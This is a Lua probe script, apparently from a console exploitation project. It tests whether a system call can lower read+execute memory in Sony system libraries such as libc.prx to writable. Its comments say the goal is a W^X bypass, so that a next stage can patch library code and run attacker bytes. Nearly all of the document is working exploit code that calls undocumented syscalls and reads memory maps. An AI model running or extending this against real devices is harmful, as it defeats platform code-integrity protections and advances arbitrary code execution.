-- CRASH_CLASS: LOW -- asks 548 only to change protections and change them back. No store is made
-- into any entry, so a page that becomes writable is not modified in this probe.
-- PROBE 1490a: can 548 lower an RX entry to RW?
--
-- 1485a proved 548 cannot lower the 38 execute-ONLY (prot 4) module texts - every one answers
-- EACCES(13). It never tried the prot 5 entries, and prot 5 is not prot 4: 1481f lists
-- libc.prx text at 0x11A07C000 and libSceFios2.prx at 0xA3C50000 as prot 5, which is read+execute,
-- so their max_prot may allow write. If a single op 2 call turns one of them into prot 3, 548 is a
-- W^X bypass on a real Sony library: the next probe patches one instruction there and the process
-- executes attacker bytes with no shellcode page and no gadget chain.
--
-- [A] 674, list every entry whose prot has bit 2 set, with its prot and name
-- [B] for each prot-5 entry: 548 op 2 to prot 3, 547, then restore to 5
-- [C] the same for the executable anonymous/GPU entries (prot 0x10, 0x20, 0x23, 0x33, 0x51)
-- [D] 548 control on an anon page so a blanket refusal is distinguishable
--
-- -- prior art:
--   results/phase36_realargs/1481f_full_map_dump_20261109_201845.txt (prot 4 vs prot 5 entries)
--   results/phase36_realargs/1485a_protect_exec_only_entry_20261109_203825.txt (prot 4 is refused)
--   results/phase36_realargs/1481g_sys548_prot_full_matrix_20261109_202102.txt (prot 5 refused as a request)

print("=== PROBE 1490a: RX -> RW VIA 548 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h, l = N(v.h), N(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return h * 4294967296 + l
end
local function qw(a) return N(memory.read_dword(a + 4)) * 4294967296 + N(memory.read_dword(a)) end
local function nm(a, maxlen)
    local o = {}
    for i = 0, maxlen - 1 do
        local c = N(memory.read_byte(a + i))
        if c == 0 then break end
        if c >= 32 and c < 127 then o[#o + 1] = string.char(c) else o[#o + 1] = "." end
    end
    return table.concat(o)
end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local ent = memory.alloc(0x40)
local done = memory.alloc(0x10)
local rec = memory.alloc(0x40)

local function protect(addr, len, prot)
    for i = 0, 0x38 do pcall(function() memory.write_byte(ent + i, 0) end) end
    pcall(function() memory.write_qword(ent + 0x00, uint64(string.format("0x%X", addr))) end)
    pcall(function() memory.write_qword(ent + 0x10, uint64(string.format("0x%X", len))) end)
    pcall(function() memory.write_dword(ent + 0x18, uint64(prot)) end)
    pcall(function() memory.write_byte(ent + 0x1C, 2) end)
    pcall(function() memory.write_dword(done, uint64(0xEEEEEEEE)) end)
    local ok, rv = pcall(function()
        return N(mk(548)(uint64(0), uint64(0), uint64(ent), uint64(1), uint64(done), uint64(0)))
    end)
    if not ok then return "EXC", 0 end
    return rv, N(memory.read_dword(done))
end

local function map547(addr)
    for i = 0, 0x3C, 4 do pcall(function() memory.write_dword(rec + i, uint64(0)) end) end
    local ok, rv = pcall(function()
        return N(mk(547)(uint64(string.format("0x%X", addr)), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    if not ok or rv ~= 0 then return -1 end
    return N(memory.read_dword(rec + 0x10))
end

-- ---------------------------------------------------------------- [A] the executable entries
print("")
print("--- [A] 674: entries whose protection has bit 2 (execute) ---")
local EXEC = {}
do
    local MAX = 400
    local buf = memory.alloc(MAX * 72 + 0x40)
    local cnt = memory.alloc(0x10)
    for i = 0, MAX * 72 + 0x30, 8 do pcall(function() memory.write_qword(buf + i, uint64(0)) end) end
    pcall(function() memory.write_dword(cnt, uint64(0)) end)
    local ok = pcall(function()
        return N(mk(674)(uint64(buf), uint64(72), uint64(MAX), uint64(cnt), uint64(0x40000000), uint64(0)))
    end)
    if not ok then
        print("  674 raised")
    else
        local n = N(memory.read_dword(cnt))
        if n <= 0 or n > MAX then n = 0 end
        print(string.format("  674 count=%d", n))
        local shown = 0
        for i = 0, n - 1 do
            local r = buf + i * 72
            local s, e = qw(r + 0x00), qw(r + 0x08)
            local p = N(memory.read_dword(r + 0x18))
            if math.floor(p / 4) % 2 == 1 then
                local name = nm(r + 0x20, 40)
                EXEC[#EXEC + 1] = {start = s, len = e - s, prot = p, name = name}
                if shown < 30 then
                    print(string.format("    0x%X len 0x%X prot=%d %s", s, e - s, p, name))
                    shown = shown + 1
                end
            end
        end
        print(string.format("  executable entries: %d", #EXEC))
    end
end

-- ---------------------------------------------------------------- [D] control
print("")
print("--- [D] 548 control on an anon page ---")
local ctl_ok = false
do
    local va = sgn(mk(477)(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va > 0x10000 then
        local p0 = map547(va)
        local rv, pr = protect(va, 0x4000, 1)
        local p1 = map547(va)
        print(string.format("  ctl 0x%X prot %d -> op2(1) rv=%s processed=%d -> %d", va, p0, tostring(rv), pr, p1))
        if rv == 0 and p1 == 1 then ctl_ok = true end
        protect(va, 0x4000, 3)
    end
end
print(string.format("[D] control usable: %s", tostring(ctl_ok)))
if not ctl_ok then
    print("548 does not move protection this boot; stopping")
    print("=== PROBE 1490a INCOMPLETE ===")
    return
end

-- ---------------------------------------------------------------- [B]/[C]
print("")
print("--- [B] 548 op 2: each executable entry -> prot 3, then restore ---")
if #EXEC == 0 then print("  none") end
local wins = 0
for i, r in ipairs(EXEC) do
    local before = map547(r.start)
    local rv, pr = protect(r.start, r.len, 3)
    local after = map547(r.start)
    local e = ""
    if rv == -1 then e = es() end
    local ok = (rv == 0 and after == 3)
    if ok then wins = wins + 1 end
    print(string.format("  %-34s prot %-3d -> op2(3) rv=%-3s processed=%-2s %-24s -> %-3d %s",
        r.name:sub(1, 34), before, tostring(rv), tostring(pr), e, after,
        ok and "*** W IS ALLOWED ***" or ""))
    if ok then
        local rb = protect(r.start, r.len, before)
        print(string.format("      restore -> rv=%s prot now %d", tostring(rb), map547(r.start)))
    end
end
print(string.format("[B] entries whose protection could be lowered to RW: %d of %d", wins, #EXEC))

local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("")
print(string.format("final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1490a COMPLETE ===")
